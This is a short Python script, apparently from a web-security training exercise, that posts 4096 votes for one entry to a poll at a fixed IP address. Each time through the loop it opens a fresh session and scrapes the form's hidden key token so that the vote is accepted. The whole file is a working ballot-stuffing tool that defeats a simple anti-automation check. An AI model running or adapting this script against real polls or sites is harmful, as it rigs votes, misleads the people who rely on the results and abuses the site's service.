#!/usr/bin/python3.8
#Author Hileamlak M. Yitayew

"""this module will be used for voting 4096 times
at the website provided"""
import requests
import time
from bs4 import BeautifulSoup

payload = {'id': '68'}
url = "http://158.69.76.135/level1.php"

i = 0
while i < 4096:

    #Handle internate connection errors if any happens
    try:
        session = requests.session()

        site = session.get(url)
        parsed_site = BeautifulSoup(site.content, 'html.parser')

        #find the the input tag that has the hidden type and get its value
        value = parsed_site.find('input',{'name':'key'}).get('value')

        payload['key'] = value
        payload['holdthedoor']='submit'

        r = session.post(url, data=payload)
        if r.status_code == 200:
            i += 1
            print("Votes casted {}".format(i))
        else:
            time.sleep(1)
        del session
    #try to handle each specific exception differently 
    except Exception:
        time.sleep(5)
